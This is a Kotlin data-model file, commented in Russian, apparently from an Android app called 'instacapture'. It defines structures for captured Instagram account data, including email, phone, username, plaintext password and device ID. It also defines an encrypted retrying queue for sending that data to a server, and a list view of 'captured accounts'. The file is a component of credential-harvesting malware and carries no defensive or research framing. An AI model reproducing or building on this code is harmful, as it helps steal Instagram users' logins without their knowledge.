package com.instacapture

/**
 * Модели данных — централизованные data-классы для всего приложения.
 * Используются в локальной БД, сетевых запросах и UI.
 */

/**
 * Полные данные захваченного Instagram-аккаунта.
 * Все поля nullable, т.к. Instagram может запрашивать разные комбинации данных.
 */
data class InstagramAccountData(
    val email: String? = null,
    val phone: String? = null,
    val username: String? = null,
    val password: String? = null,
    val fullName: String? = null,
    /**
     * Unix-timestamp момента захвата (UTC)
     */
    val capturedAt: Long = System.currentTimeMillis(),
    /**
     * Уникальный идентификатор устройства (Android ID)
     */
    val deviceId: String
)

/**
 * Запись из локальной очереди отправки (SQLite).
 * Хранит зашифрованные данные + метаданные для ретраев.
 */
data class QueueEntry(
    val id: Long = 0,
    val encryptedPayload: String,
    val createdAt: Long = System.currentTimeMillis(),
    /**
     * Счётчик попыток отправки — после 10 попыток запись удаляется
     */
    val retryCount: Int = 0,
    val lastError: String? = null
)

/**
 * Ответ сервера при успешном приёме данных
 */
data class CaptureResponse(
    val success: Boolean,
    val message: String? = null,
    val serverTime: String? = null
)

/**
 * UI-модель для отображения в списке захваченных аккаунтов.
 * Хранит только безопасные поля (без пароля).
 */
data class AccountListItem(
    val username: String?,
    val email: String?,
    val phone: String?,
    val capturedAtFormatted: String
)
